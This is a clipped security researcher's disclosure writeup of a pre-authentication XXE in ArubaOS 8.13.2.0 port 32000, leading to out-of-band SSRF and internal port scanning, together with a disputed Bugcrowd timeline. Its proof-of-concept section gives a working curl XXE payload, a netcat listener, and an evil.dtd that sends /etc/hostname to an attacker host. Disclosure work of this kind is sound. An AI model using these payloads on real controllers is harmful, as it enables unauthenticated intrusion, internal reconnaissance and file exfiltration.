---
title: ArubaOS 8.13.2.0 Pre-Auth XXE → OOB SSRF & Internal Port Scan on Port 32000 | CWE-611 HPE Bugcrowd | Netacoding | Cybersecurity, Assembly & Network Research
source: https://netacoding.com/posts/xxe-ssrf/
source_host: netacoding.com
clip_date: 2026-10-01T10:20:49+08:00
trace_id: a6ca331e-2a3b-4897-8ab6-abba8ff3a7ac
content_hash: 7b027b3b87248f0419eb30155a88b157b3b8c617181c5c7f7ace8ff3e4c5f499
status: synced
tags:
  - 漏洞分析
  - 协议分析
series: null
feed_source: Netacoding·协议/逆向
ai_summary: ArubaOS 8.13.2.0 的 32000 端口 XML 接口无需任何认证即解析外部实体，可被用于 OOB SSRF 与内网端口扫描；HPE Bugcrowd 以“理论性/无有效 PoC”关闭该提交。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3ec75244-d011-81d6-ac48-e3dc082e05d8
ioc:
  cves: []
  cwes:
    - CWE-611
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> ArubaOS 8.13.2.0 的 32000 端口 XML 接口无需任何认证即解析外部实体，可被用于 OOB SSRF 与内网端口扫描；HPE Bugcrowd 以“理论性/无有效 PoC”关闭该提交。
> 
> - **目标与攻击面：** ArubaOS 8.13.2.0 LSR（Build 95415，ArubaMC-VA-US），`http://<ip>:32000/` 的 `default-xml-api` AAA profile 出厂即无认证，评 CVSS 9.3、CWE-611。
> - **利用链：** 向该端点 POST `text/xml`，在 DOCTYPE 中声明 `SYSTEM` 实体，控制器即主动外连攻击者主机并发出 `GET /test HTTP/1.0`；也可拉取并处理攻击者托管的外部 DTD。
> - **内网探测：** 以 `127.0.0.1` 为目标的 SSRF 在 30 秒内对 22/80/443/4343/8080/8443/3306/5432/9200 均返回 `<dialog>success</dialog>`，确认端口开放。
> - **四类证据：** 线级 pcap（三次握手 + HTTP 请求）、目标自身 sshd 日志出现 `127.0.0.1` 来源的 `GET / HTTP/1.0`、攻击者 HTTP 服务三次 `evil.dtd` 拉取记录（02:33/02:36/02:38）、9 个内网端口扫描结果。
> - **争议与时间线：** OOB 回调已证明实体解析，CWE-611 不要求带内文件外传；5 月 6 日提交，5 月 10 日判 N/A，两次 RaR 均无回应，全流程 25 天，厂商既不修复也不发公告。

**Submission ID:** 9e946ca3 — HPE Networking Product Public Program (Bugcrowd)  
**Status:** Closed as *“Not Applicable — theoretical / no valid PoC”*  
**GitHub:** [github.com/JM00NJ/HPE-Aruba-AOS8-Vulnerabilities](https://github.com/JM00NJ/HPE-Aruba-AOS8-Vulnerabilities)

* * *

## Background

This is a documentation of a pre-authentication XML External Entity (XXE) injection vulnerability with confirmed Out-of-Band (OOB) Server-Side Request Forgery (SSRF) in ArubaOS 8.13.2.0 LSR. The vulnerability was submitted to the HPE Networking Bug Bounty Program on Bugcrowd on May 6, 2026.

Despite four independent pieces of evidence — including wire-level packet captures and the target system’s own daemon logs confirming server-side execution — the submission was closed as “theoretical / no valid PoC.” Both Requests for Response went unanswered. This writeup documents the vulnerability, the evidence, and the full timeline so the security community can evaluate independently.

* * *

## Target

| Field | Value |
| --- | --- |
| Product | HPE Aruba Networking Wireless — AOS-8 Controller |
| Version | ArubaOS 8.13.2.0 LSR (Build 95415, compiled 2026-03-25) |
| Model | ArubaMC-VA-US |
| Endpoint | `http://<device-ip>:32000/` |
| Authentication | None required |
| CVSS v3.1 | 9.3 Critical — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| CWE | CWE-611: Improper Restriction of XML External Entity Reference |

* * *

## Vulnerability Description

Port 32000/TCP on ArubaOS 8.13.2.0 exposes an XML management interface (`default-xml-api` AAA profile) reachable **without any authentication**. The XML parser processes `SYSTEM` external entity declarations, resolving them against attacker-controlled infrastructure.

This enables:

1.  **OOB SSRF**— forcing the controller to initiate outbound HTTP connections to arbitrary hosts
2.  **Internal network enumeration**— using the controller as an unwilling proxy to probe internal services
3.  **External DTD resolution**— fetching and processing attacker-hosted DTD files

The endpoint is not a misconfiguration. The AAA profile `default-xml-api` ships with no authentication configured.

* * *

## Proof of Concept

### Step 1 — Direct OOB SSRF

```bash
nc -lvp 9999
```

```bash
curl -s -X POST "http://<target>:32000/" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<attacker>:9999/test">]>
<aruba><opcode>&xxe;</opcode></aruba>'
```

**Observed on attacker listener:**

```
Connection received on 192.168.56.50 36048
GET /test HTTP/1.0
Host: <attacker-ip>:9999
```

### Step 2 — External DTD Resolution

`evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://<attacker>:9999/?d=%file;'>">
%eval;
%send;
```

**Observed on attacker HTTP server:**

```swift
192.168.56.50 - [06/May/2026 02:33:43] "GET /evil.dtd HTTP/1.0" 200 -
192.168.56.50 - [06/May/2026 02:36:10] "GET /evil.dtd HTTP/1.0" 200 -
192.168.56.50 - [06/May/2026 02:38:17] "GET /evil.dtd HTTP/1.0" 200 -
```

### Step 3 — Internal Port Scanning via SSRF

The controller returned `<dialog>success</dialog>` for probes against `127.0.0.1` on ports: **22, 80, 443, 4343, 8080, 8443, 3306, 5432, 9200**— all confirmed open in under 30 seconds.

* * *

## Evidence

### Evidence 1 — Wire-Level Packet Capture

`obb_proof.pcapng` confirms controller-initiated TCP connection to attacker infrastructure, full 3-way handshake, and `GET /test HTTP/1.0` transmission.

### Evidence 2 — Target System’s Own Daemon Logs

```
May 13 07:31:56 |sshd| Bad protocol version identification 'GET / HTTP/1.0' from 127.0.0.1 port 33144
```

This log entry can only be produced when a server-side process connects to local sshd and sends an HTTP request. No external actor can produce a `127.0.0.1` -sourced connection to a service on localhost.

**The triage response was never reconciled with this log entry.**

### Evidence 3 — External DTD Fetch Log

Three independent HTTP server log entries confirming controller-fetched attacker-hosted content (timestamps: 02:33, 02:36, 02:38).

### Evidence 4 — Internal Port Scan

9 internal ports confirmed open via `<dialog>success</dialog>` responses. Screenshot and reproduction script attached to original submission.

* * *

## Why The “Theoretical” Classification Is Incorrect

CWE-611 does not require in-band file exfiltration to be valid. OOB callback confirming external entity resolution on a pre-authentication endpoint **is the vulnerability**, consistent with [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) and [PortSwigger Blind XXE](https://portswigger.net/web-security/xxe/blind).

* * *

## Timeline

| Date | Event |
| --- | --- |
| 06 May 2026 | Submission created (9e946ca3) |
| 10 May 2026 | **N/A — “theoretical, no valid PoC”** |
| 11 May 2026 | First RaR submitted |
| 13 May 2026 | sshd log evidence added |
| 27 May 2026 | **First RaR expired — no response** |
| 28 May 2026 | Second and final RaR |
| 31 May 2026 | Researcher concluded Bugcrowd disclosure |

**Total: 25 days. Triage response to all evidence: none.**

* * *

## Disclosure Note

The program has determined no vulnerability exists. No fix is forthcoming, no advisory will be published. The 60-day post-advisory window does not apply to findings the vendor has declined to acknowledge. This writeup is published for independent community evaluation.

*Vesqer / JM00NJ — [netacoding.com](https://netacoding.com/)*

**MITRE ATT&CK:** [T1190](https://attack.mitre.org/techniques/T1190/) · [T1599](https://attack.mitre.org/techniques/T1599/)

## Related

-   [Ghost Leak — Pre-Auth Buffer Over-read via TTL=0 + IP Total Length in ArubaOS 8.13.2.0](https://netacoding.com/posts/ghost-leak/)
-   [Pre-Authentication ICMP Reflection & Smurf Amplification in ArubaOS 8.13.2.0](https://netacoding.com/posts/smurf-reflection/)
-   [Smurf Amplification in 2026: Pre-Auth ICMP Reflection via L2 Broadcast](https://netacoding.com/posts/smurf-amplification/)
-   [SHA-256 Output Distribution Analysis/CDP](https://netacoding.com/posts/cdp-sha256-structural-analysis/)
-   [ICMP-Ghost: Fileless C2 with ICMP & DNS Tunneling in Pure x64 Assembly](https://netacoding.com/posts/icmp-ghost/)
